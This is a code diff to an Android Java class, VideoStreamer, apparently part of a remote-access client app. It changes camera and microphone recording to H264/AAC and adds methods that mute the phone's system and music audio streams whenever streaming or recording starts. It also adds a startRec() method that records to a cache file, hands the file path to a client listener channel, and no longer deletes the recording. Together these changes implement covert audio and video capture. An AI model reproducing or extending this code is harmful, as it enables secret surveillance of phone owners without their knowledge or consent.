@@ -2,8 +2,10 @@ package my.app.Library;
 
 import android.app.Activity;
 import android.hardware.Camera;
+import android.media.AudioManager;
 import android.media.CamcorderProfile;
 import android.media.MediaRecorder;
+import android.os.Environment;
 import android.util.Log;
 import android.view.Surface;
 import android.view.SurfaceHolder;
@@ -14,26 +16,27 @@ import android.content.Context;
 import my.app.client.LauncherActivity;
 import my.app.client.R;
 
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
+import java.io.*;
 
 public class VideoStreamer {
     private Camera camera;
     private MediaRecorder mediaRecorder;
     private boolean streaming = false;
     private Thread stream;
+    private Thread loadf;
     private ClientListener cl;
     private File tempstore;
-    private FileInputStream fis;
+    private FileInputStream fis =null;
     private int bytesRead = 0;
     private byte[] dataToSend;
     private int numCam = Camera.getNumberOfCameras();
     private int FrontCam = Camera.CameraInfo.CAMERA_FACING_FRONT;
     private int BackCam = Camera.CameraInfo.CAMERA_FACING_BACK;
     private int channel;
-    private boolean isPrepared = false;
     private TextureView mPreview;
+    private File SDCardpath;
+    private BufferedInputStream buf = null;
+    private boolean rec = false;
 
     public VideoStreamer(ClientListener c, byte[] args, int chan) {
         cl = c;
@@ -47,19 +50,18 @@ public class VideoStreamer {
         } else {
             camera = Camera.open();
         }
+        mPreview = cl.getPreview();
         stream = new Thread(
                 new Runnable() {
                     public void run() {
                         record();
                     }
                 });
-        /*SurfaceView surView = new SurfaceView(cl); //(SurfaceView)findViewById(R.layout.videoview);
-        surHol = surView.getHolder();
-        surHol.addCallback(this);*/
         try {
-            tempstore = File.createTempFile("Tryingagain", null, cl.getCacheDir());
-            boolean abc = tempstore.exists();
+            SDCardpath = Environment.getExternalStorageDirectory();
+            tempstore = new File(cl.getCacheDir()+"/Tryingagain.mp4");//(SDCardpath.getAbsolutePath() +"/Tryingagain.mp4" ); // cl.getCacheDir()
             fis = new FileInputStream(tempstore);
+            buf = new BufferedInputStream(fis);
         } catch (Exception e) {
             Log.e("VideoStream", "Problem in creating File or Stream");
 
@@ -67,19 +69,27 @@ public class VideoStreamer {
         }
 
     }
-
+    public void mute(){
+        AudioManager audioManager = (AudioManager) cl.getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
+        audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
+        audioManager.setStreamMute(AudioManager.STREAM_MUSIC,true);
+    }
+    public void unmute(){
+        AudioManager audioManager = (AudioManager) cl.getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
+        audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, false);
+        audioManager.setStreamMute(AudioManager.STREAM_MUSIC,false);
+    }
     public void record() {
         long available;
         byte[] buffer = new byte[4096];
-        mPreview = cl.getPreview();
         prepare();
         mediaRecorder.start();
         try {
             while (streaming) {
-                available = fis.available();
+                available = buf.available();
                 //Log.i("MediaRecoder","Bytes aviable: "+available);
                 if (available >0) {
-                    bytesRead = fis.read(buffer, 0, buffer.length);
+                    bytesRead = buf.read(buffer);
                     Log.i("MediaRecorder", "BytesRead: " + bytesRead);
                     if (bytesRead == -1) {
                         Log.i("Mediarecorder", "break weil keine daten");
@@ -100,19 +110,21 @@ public class VideoStreamer {
 
     public void startStream() {
         streaming = true;
+        mute();
         stream.start();
     }
 
     public void stopStream() {
         try{
             mediaRecorder.stop();
+            unmute();
         }catch(RuntimeException stopException){
 
         }
         streaming = false;
         mediaRecorder.reset();
         mediaRecorder.release();
-        tempstore.delete();
+        //tempstore.delete();
         camera.release();
         mediaRecorder = null;
         camera = null;
@@ -128,23 +140,40 @@ public class VideoStreamer {
         mediaRecorder = new MediaRecorder();
         camera.unlock();
         mediaRecorder.setCamera(camera);
-        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
+        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
+        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.DEFAULT);
         mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
-        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H263);
-        //mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));
-        //mediaRecorder.setVideoFrameRate(60);
+        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
         mediaRecorder.setOutputFile(tempstore.getAbsolutePath());
         try {
             mediaRecorder.prepare();
-            isPrepared = true;
         } catch (IOException | IllegalStateException e) {
             mediaRecorder.reset();
             mediaRecorder.release();
+            camera.release();
             return false;
         }
         return true;
+    }
+    public void startRec(){
+        rec=true;
+        mute();
+        prepare();
+        mediaRecorder.start();
+        cl.handleData(channel,tempstore.getAbsolutePath().getBytes());
+    }
 
+    public void stopRec(){
+        mediaRecorder.reset();
+        mediaRecorder.release();
+        camera.release();
+        mediaRecorder = null;
+        camera = null;
+        rec = false;
+        unmute();
+    }
+    public boolean getRecord(){
+        return rec;
     }
 }
